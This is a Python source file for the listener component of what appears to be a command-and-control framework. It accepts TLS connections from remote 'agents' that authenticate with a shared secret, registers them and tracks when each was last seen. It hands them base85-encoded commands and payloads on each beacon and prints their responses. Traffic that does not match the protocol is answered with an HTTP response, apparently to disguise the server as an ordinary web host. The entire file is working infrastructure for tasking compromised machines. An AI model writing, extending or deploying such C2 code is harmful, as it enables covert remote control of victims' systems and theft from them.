import json
import time
import threading
import ssl
import logging
import base64
import uuid
from socket import socket, AF_INET, SOCK_STREAM, SO_REUSEADDR, SOL_SOCKET
from lib.common.responses import serve_http
from lib.common.agent import Agent


class Listener():

    def __init__(self, port, host, secret, agents, listeners):
        self.port = port
        self.host = host
        self.secret = secret
        self.agents = agents
        self.listeners = listeners
        self.uuid = uuid.uuid4()
        self._killed = False

    def _kill(self):
        print('closing socket')
        socket(AF_INET, 
               SOCK_STREAM).connect((self.host, self.port))
        self.tcp_socket.close()

    def get_response(self, json_stub, connection):
        agent_uuid = json_stub['uuid']
        response = json_stub['data']
        # If the agent has already been associated, skip
        for uuid, agent in self.agents.items():
            if uuid == agent_uuid and response:
                agent.update_lastseen()
                print(response)
                connection.send('_response{"status" : "ACK"}'.encode())
                connection.close()
                return
        connection.close()

    def associate_agent(self, json_stub, connection):
        agent_uuid = json_stub['uuid']
        # If the agent has already been associated, skip
        for uuid, agent in self.agents.items():
            if uuid == agent_uuid:
                agent.update_lastseen()
                connection.close()
                return
        lastseen = time.time()
        tmp_agent = Agent(self, agent_uuid, lastseen)
        self.agents[agent_uuid] = tmp_agent
        logging.warning('Agent associated!')
        connection.send('_response{"status" : "ACK"}'.encode())
        connection.close()

    def beacon_respond(self, json_stub, connection):
        agent_uuid = json_stub['uuid']
        for uuid, agent in self.agents.items():
            if uuid == agent_uuid:
                agent.update_lastseen()
                # Commands take precedence over payloads
                command = agent.get_command()
                if command:
                    response_packet_stub = {
                        'status': 'OK',
                        'command': base64.b85encode(command.encode()).decode(),
                        'payload': None
                    }
                    cmd_pkt = ('_response' + json.dumps(response_packet_stub))
                    connection.send(cmd_pkt.encode())
                    connection.close()
                    return 

                payload = agent.get_payload()
                if payload:
                    response_packet_stub = {
                        'status': 'OK',
                        'command': None,
                        'payload': base64.b85encode(payload.encode()).decode()
                    }
                    cmd_pkt = ('_response' + json.dumps(response_packet_stub))
                    connection.send(cmd_pkt.encode())
                    connection.close()
                    return 

                
                response_packet_stub = {
                    'status': 'OK',
                    'command': None,
                    'payload': None
                }
                cmd_pkt = ('_response' + json.dumps(response_packet_stub))
                connection.send(cmd_pkt.encode())
                connection.close()
                return 

        connection.close()

    def handle_proto_msg(self, proto_msg, connection):
        """
        Protocol handler. Protocol defines the following packet types:

        Association:
        _associate{ secret:"mysecret", uuid:"myuuid" }

        Beacon:
        _beacon{ secret:"mysecret", uuid:"myuuid" }

        Response:
        _response{ secret:"mysecret", uuid:"myuuid", data:"cmd_response" }
        """

        if '_associate' in proto_msg:
            json_stub = json.loads(proto_msg[10:])
            try:
                if json_stub['secret'] == self.secret:
                    self.associate_agent(json_stub, connection)
            except KeyError:
                serve_http(connection, proto_msg)
        elif '_beacon' in proto_msg:
            json_stub = json.loads(proto_msg[7:])
            try:
                if json_stub['secret'] == self.secret:
                    self.beacon_respond(json_stub, connection)
            except KeyError:
                serve_http(connection, proto_msg)
        elif '_response' in proto_msg:
            json_stub = json.loads(proto_msg[9:])
            try:
                if json_stub['secret'] == self.secret:
                    self.get_response(json_stub, connection)
            except KeyError:
                serve_http(connection, proto_msg)
        else:
            serve_http(connection, proto_msg)
        connection.close()

    def main_thread(self):
        self.tcp_socket = socket(AF_INET, SOCK_STREAM)
        self.tcp_socket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        try:
            self.tcp_socket.bind((self.host, self.port))
            self.listeners.append(self)
        except:
            logging.warning('Listener failed.')
            return
        self.tcp_socket.listen(1)
        self.wrapped_socket = ssl.wrap_socket(self.tcp_socket,
                                              server_side=True,
                                              certfile='data/cert.pem',
                                              keyfile='data/cert.pem',
                                              ssl_version=ssl.PROTOCOL_TLSv1_2)

        while not self._killed:
            try:
                connection, address = self.wrapped_socket.accept()
                data = str(connection.recv(12000).decode())
                threading.Thread(
                    target=self.handle_proto_msg,
                    args=((data, connection))
                    ).start()
            except ssl.SSLError as e:
                print('ssl error' + str(e))
